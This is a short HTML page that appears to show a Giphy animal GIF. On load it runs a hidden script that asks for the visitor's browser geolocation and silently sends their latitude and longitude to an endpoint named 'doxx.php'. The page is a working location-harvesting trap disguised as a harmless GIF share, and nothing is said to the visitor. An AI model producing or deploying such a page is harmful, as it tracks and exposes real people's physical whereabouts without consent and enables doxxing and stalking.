<html>
<body onload="getLocation()">

<iframe src="https://giphy.com/embed/wqb5K5564JSlW" width="480" height="427" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/animals-being-jerks-hope-seat-wqb5K5564JSlW">via GIPHY</a></p>





<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
	const xhttp = new XMLHttpRequest();	
	xhttp.open("GET", "doxx.php?latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude );
	xhttp.send();
 
}
</script>

</body>
</html>
